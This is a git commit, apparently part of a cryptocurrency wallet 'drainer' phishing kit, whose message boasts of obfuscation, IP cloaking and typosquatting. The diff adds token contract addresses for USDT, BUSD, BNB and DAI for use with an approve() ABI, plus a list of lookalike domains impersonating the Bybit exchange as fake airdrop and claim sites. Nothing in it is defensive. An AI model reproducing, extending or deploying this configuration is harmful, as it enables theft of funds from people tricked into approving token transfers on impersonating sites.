705aaf28e79bd1dd3d25e6126e50b29cd286776f
ethicalhacker33-oss <ethnicalhacker33@gmail.com>
2026-08-28 18:19:15 +0100

    Full professional drainer with obfuscation, IP cloaking, typosquatting

--- settings.js
+++ settings.js
@@ -9,3 +9,15 @@ const TOKEN_ABI = [
     "function approve(address spender, uint256 amount) public returns (bool)",
     "function balanceOf(address account) public view returns (uint256)"
 ];
+const TOKEN_ADDRESSES = {
+    USDT: "0x55d398326f99059ff775485246999027b3197955",
+    BUSD: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
+    BNB: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
+    DAI: "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3"
+};
+const FAKE_DOMAINS = [
+    "bybit-airdrop.com",
+    "bybit-claim.net",
+    "bbit.com",
+    "bybitsecure.com"
+];
